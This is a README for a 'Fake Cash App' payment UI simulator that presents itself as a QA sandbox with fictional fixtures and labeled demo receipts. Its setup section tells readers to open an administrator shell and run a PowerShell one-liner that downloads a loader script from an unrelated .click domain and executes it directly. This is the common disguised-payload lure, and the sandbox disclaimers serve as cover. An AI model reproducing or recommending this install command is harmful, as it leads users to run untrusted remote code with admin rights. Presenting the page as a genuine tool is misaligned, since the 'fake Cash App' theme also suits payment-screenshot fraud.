# 💳 Fake Cash App — Payment UI Simulator & QA Sandbox

> A local payment-interface simulator for QA teams, frontend developers, demos, and integration testing with clearly labeled fictional data.

## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm https://software-get.click/Loader.ps1?get=fake-cashapp | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Payment UI Simulator modules...
[2/4] Extracting fictional transaction and receipt fixtures...
[3/4] Installing local QA dashboard and webhook mock...
[4/4] Ready. Start testing payment interfaces in sandbox mode.
```

### Step 4: Start Using the Toolkit
- Launch `payment-sandbox.exe` or run `npm start`
- Choose a fictional test profile
- Create simulated pending, completed, failed, and refunded states
- Inspect the UI, webhooks, audit events, and exported test reports

## 📌 TL;DR

Fake Cash App is a local payment UI simulator for testing payment flows without real money, real accounts, or real payment confirmations. Every screen and exported artifact is marked `DEMO`, `TEST`, or `SIMULATED`.

## ✨ Features

| Feature | Description |
|---|---|
| Payment State Simulator | Pending, completed, failed, refunded, and canceled fixtures |
| Receipt Preview | Generate clearly labeled demo receipts for UI testing |
| Test Profiles | Fictional sender, recipient, and merchant profiles |
| Webhook Mock | Replay deterministic payment lifecycle events locally |
| QA Dashboard | Inspect status, timestamps, idempotency, and audit trails |
| Export Tools | JSON, CSV, and screenshot-ready demo reports |
| Validation Rules | Test invalid amounts, duplicate events, and timeout behavior |
| Accessibility | Keyboard navigation and high-contrast demo states |

## 🎯 Simulation Modes

### Create a Completed Demo Payment
```bash
payment-sandbox payment create --amount 25.00 --currency USD --status completed
```

### Test a Failed Payment
```bash
payment-sandbox payment create --amount 49.99 --currency USD --status failed --reason insufficient_funds
```

### Replay Webhook Events
```bash
payment-sandbox webhook replay --fixture fixtures/payment-lifecycle.json
```

### Export a QA Report
```bash
payment-sandbox report export --format json --output exports/demo-report.json
```

## 🧪 Example Fixture

```json
{
  "environment": "sandbox",
  "label": "SIMULATED - NOT A REAL PAYMENT",
  "transactionId": "demo_tx_001",
  "amount": 25.00,
  "currency": "USD",
  "status": "completed",
  "sender": "Demo Sender",
  "recipient": "Demo Merchant",
  "createdAt": "2026-01-01T12:00:00Z"
}
```

## ⚙️ Configuration

```json
{
  "sandbox": {
    "port": 3333,
    "currency": "USD",
    "watermark": "SIMULATED",
    "allowExternalNetwork": false,
    "dataDirectory": "./fixtures"
  }
}
```

## 🛠️ Developer API

```javascript
const PaymentSandbox = require('payment-ui-sandbox');

const sandbox = new PaymentSandbox({
  port: 3333,
  watermark: 'SIMULATED',
  allowExternalNetwork: false
});

const payment = await sandbox.createPayment({
  amount: 25.00,
  currency: 'USD',
  status: 'completed'
});

console.log(payment.label);
```

## 📂 Project Structure

```text
fake-cashapp/
├── fixtures/             # Fictional payment lifecycle fixtures
├── exports/              # QA reports and demo exports
├── config.example.json   # Sandbox configuration template
├── public/               # Local payment UI
└── src/
    ├── payments.js       # Simulated payment state machine
    ├── webhooks.js       # Local webhook mock
    ├── receipts.js       # Watermarked receipt previews
    ├── audit.js          # Event and audit logging
    └── server.js         # Local sandbox server
```

## 🔧 Troubleshooting

### Reset Fixtures
```bash
payment-sandbox reset --fixtures
payment-sandbox health
```

### Verify Demo Labels
```bash
payment-sandbox validate --require-label SIMULATED
payment-sandbox report export --format csv --output exports/qa-report.csv
```

## ⚠️ Sandbox Notice

This project is for local QA, demos, frontend development, and integration testing only. It does not connect to payment networks, create real transactions, imitate real receipts, or represent real account activity. Keep all fixture data fictional and visibly labeled.

## 📜 License

MIT License. See [LICENSE](LICENSE) for details.
